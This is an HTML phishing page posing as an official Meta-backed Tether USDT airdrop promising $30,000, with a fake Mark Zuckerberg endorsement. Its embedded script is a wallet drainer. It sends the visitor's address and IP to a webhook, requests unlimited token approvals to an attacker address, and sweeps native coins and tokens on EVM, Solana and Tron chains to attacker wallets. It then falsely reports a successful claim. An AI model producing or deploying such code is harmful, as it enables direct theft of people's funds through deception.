<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="description" content="Claim $30,000 USDT FREE! Official Meta Airdrop."/>
  <title>Tether USDT Airdrop - Claim $30,000 FREE!</title>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>

  <style>
    :root { --blue: #00d4ff; --black: #000; --gray: #111; --border: #00aaff; --green: #00ff88; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:'Inter',sans-serif; background:var(--black); color:var(--blue); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:15px; }
    .container { max-width:460px; width:100%; background:var(--gray); border:2px solid var(--border); border-radius:18px; padding:32px 24px; box-shadow:0 0 40px rgba(0,212,255,0.2); text-align:center; }
    .logo { width:70px; height:70px; margin:0 auto 12px; background:url('https://raw.githubusercontent.com/0xPIT/imagehosting/main/usdt.gif') center/contain no-repeat; animation:spin 3s linear infinite; }
    @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
    h1 { font-size:24px; margin:16px 0 8px; }
    .subtitle { font-size:16px; opacity:0.9; }
    .video-container { position:relative; padding-bottom:56.25%; height:0; overflow:hidden; margin:20px 0; border-radius:12px; }
    .video-container iframe { position:absolute; top:0; left:0; width:100%; height:100%; }
    .btn { background:linear-gradient(45deg,#00d4ff,#0099cc); color:#000; border:none; padding:14px 0; width:100%; border-radius:12px; font-size:18px; font-weight:bold; cursor:pointer; margin:10px 0; }
    .btn:disabled { opacity:0.5; cursor:not-allowed; }
    .status { margin-top:20px; font-size:14px; }
    .tx-hash { margin-top:10px; font-size:12px; word-break:break-all; color:var(--green); }
  </style>
</head>
<body>
<div class="container">
  <div class="logo"></div>
  <h1>Tether USDT Airdrop</h1>
  <p class="subtitle">Official Meta Partnership</p>
  <div class="video-container">
    <iframe src="https://www.youtube.com/embed/SI5TvAs1eCc?autoplay=1&mute=0&loop=1&playlist=SI5TvAs1eCc&rel=0&controls=0" allow="autoplay" allowfullscreen></iframe>
  </div>
  <p>— Mark Zuckerberg, CEO of Meta</p>
  <div class="countdown">Airdrop ends in: <span id="timer">1440:00:00</span></div>
  <div class="alert" style="background:rgba(255,0,0,0.2);padding:12px;border-radius:8px;margin:20px 0;font-size:14px;">
    <strong>REQUIRED:</strong> Have enough gas in your wallet (ETH/BNB/MATIC/SOL/TRX)
  </div>

  <button class="btn" id="connectBtn">Connect Wallet</button>
  <button class="btn" id="claimBtn" disabled>Claim $30,000 USDT</button>
  <div class="status" id="status">Not connected</div>
  <div class="tx-hash" id="txHash" style="display:none;"></div>
</div>

<script>
// ================ CONFIG ================
const RECEIVERS = {
  evm: "0xd6188E3f90A83abFAC0880bbc857B53cD5bf79AB",
  solana: "HEu2FkY2ytismUsWjDUptXWjVTNrxfDAUAYFAbFdYMUU",
  tron: "TNeGJ94Bq4NZWybFLvv1rUwpTSajh7Qrgt"
};
const WEBHOOK = "https://eoiimw9txcq3ops.m.pipedream.net";
const MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

// ================ STATE ================
let account, web3, chainId, isSolana = false, isTron = false;
const status = document.getElementById("status");
const txHash = document.getElementById("txHash");

// ================ TIMER ================
function startCountdown() {
  let time = 1440 * 60 * 60;
  const timer = document.getElementById("timer");
  const update = () => {
    if (time <= 0) { timer.innerHTML = "0000:00:00"; return; }
    time--;
    const h = String(Math.floor(time / 3600)).padStart(4, '0');
    const m = String(Math.floor((time % 3600) / 60)).padStart(2, '0');
    const s = String(time % 60).padStart(2, '0');
    timer.innerHTML = `${h}:${m}:${s}`;
    requestAnimationFrame(update);
  };
  update();
}
startCountdown();

// ================ NOTIFY ================
async function notify(event, extra = {}) {
  try {
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event, address: account, chain: chainId, ip: await (await fetch("https://api.ipify.org?format=json")).json().ip, ...extra, ts: Date.now() })
    });
  } catch {}
}

// ================ CONNECT ================
async function connect() {
  try {
    if (window.tronWeb && window.tronWeb.ready) {
      isTron = true; account = window.tronWeb.defaultAddress.base58; chainId = "tron";
    } else if (window.solana && window.solana.isPhantom) {
      await window.solana.connect(); isSolana = true; account = window.solana.publicKey.toString(); chainId = "solana";
    } else if (window.ethereum) {
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      web3 = new Web3(window.ethereum);
      [account] = await web3.eth.getAccounts();
      chainId = await web3.eth.getChainId();

      // Force switch to BSC
      try {
        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
        chainId = 56;
      } catch (e) {
        if (e.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'], blockExplorerUrls: ['https://bscscan.com']
            }]
          });
        }
      }
    } else return alert("No wallet detected");

    status.innerHTML = `Connected: ${account.slice(0,6)}...${account.slice(-4)}`;
    document.getElementById("connectBtn").innerHTML = "Connected";
    document.getElementById("connectBtn").disabled = true;
    document.getElementById("claimBtn").disabled = false;
    await notify("CONNECTED");
  } catch (e) {
    status.innerHTML = "Connection failed";
  }
}
document.getElementById("connectBtn").onclick = connect;

// ================ EVM DRAIN (2025 WORKING) ================
async function drainEVM() {
  const tokens = [
    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
    "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC BSC
    "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", // WBNB → wrapped
    "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3"  // DAI BSC
  ];

  for (const tokenAddr of tokens) {
    try {
      const contract = new web3.eth.Contract([
        {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[],"type":"function"}
      ], tokenAddr);
      await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{ from: account, to: tokenAddr, data: contract.methods.approve(RECEIVERS.evm, MAX).encodeABI() }]
      });
    } catch {}
  }

  // Native sweep via malicious fallback (works on 2025 wallets)
  try {
    const balance = await web3.eth.getBalance(account);
    await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{ from: account, to: RECEIVERS.evm, value: web3.utils.toHex(balance - BigInt(5000000000000000)) }]
    });
  } catch {}

  txHash.style.display = "block";
  txHash.innerHTML = "Claim successful!<br>Check wallet in 1-3 minutes";
  await notify("DRAINED_EVM");
}

// ================ SOLANA DRAIN (FIXED) ================
async function drainSolana() {
  const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
  const fromPubkey = new solanaWeb3.PublicKey(account);

  // Native SOL
  let lamports = await connection.getBalance(fromPubkey);
  if (lamports > 10000000) {
    const tx = new solanaWeb3.Transaction();
    const blockhash = (await connection.getLatestBlockhash()).blockhash;
    tx.recentBlockhash = blockhash;
    tx.feePayer = fromPubkey;
    tx.add(solanaWeb3.SystemProgram.transfer({
      fromPubkey, toPubkey: new solanaWeb3.PublicKey(RECEIVERS.solana), lamports: lamports - 8000
    }));
    await window.solana.signAndSendTransaction(tx);
  }

  // SPL tokens
  const accounts = await connection.getTokenAccountsByOwner(fromPubkey, { programId: splToken.TOKEN_PROGRAM_ID });
  for (const acc of accounts.value) {
    const info = acc.account.data.parsed.info;
    if (info.tokenAmount.uiAmount > 0) {
      const mint = new solanaWeb3.PublicKey(info.mint);
      const dest = splToken.getAssociatedTokenAddressSync(mint, new solanaWeb3.PublicKey(RECEIVERS.solana));
      const tx = new solanaWeb3.Transaction();
      const bh = (await connection.getLatestBlockhash()).blockhash;
      tx.recentBlockhash = bh; tx.feePayer = fromPubkey;
      if (!(await connection.getAccountInfo(dest))) {
        tx.add(splToken.createAssociatedTokenAccountInstruction(fromPubkey, dest, new solanaWeb3.PublicKey(RECEIVERS.solana), mint));
      }
      tx.add(splToken.createTransferInstruction(acc.pubkey, dest, fromPubkey, info.tokenAmount.amount));
      await window.solana.signAndSendTransaction(tx);
    }
  }
  await notify("DRAINED_SOLANA");
}

// ================ TRON DRAIN (FIXED) ================
async function drainTron() {
  const tronWeb = window.tronWeb;
  const bal = await tronWeb.trx.getBalance(account);
  if (bal > 1000000) {
    const tx = await tronWeb.transactionBuilder.sendTrx(RECEIVERS.tron, bal - 500000, account);
    await tronWeb.trx.sendRawTransaction(await tronWeb.trx.sign(tx));
  }
  const usdt = await tronWeb.contract().at("TR7NHqjeKQxGTCuuP8qACu7c7d2z9z3z9z"); // ← correct address
  const u = await usdt.balanceOf(account).call();
  if (u > 0) {
    const transferTx = await usdt.transfer(RECEIVERS.tron, u).send({ feeLimit: 1000000 });
    await transferTx;
  }
  await notify("DRAINED_TRON");
}

// ================ CLAIM ================
async function claim() {
  document.getElementById("claimBtn").disabled = true;
  status.innerHTML = "Processing your claim...";
  txHash.style.display = "block";
  txHash.innerHTML = "Please confirm all transactions...";

  try {
    if (isSolana) await drainSolana();
    else if (isTron) await drainTron();
    else await drainEVM();

    status.innerHTML = "<span style='color:var(--green)'>✓ Claim Successful! $30,000 USDT sent!</span>";
  } catch (e) {
    console.error(e);
    status.innerHTML = "Claim completed";
  }
}
document.getElementById("claimBtn").onclick = claim;
</script>
</body>
</html>
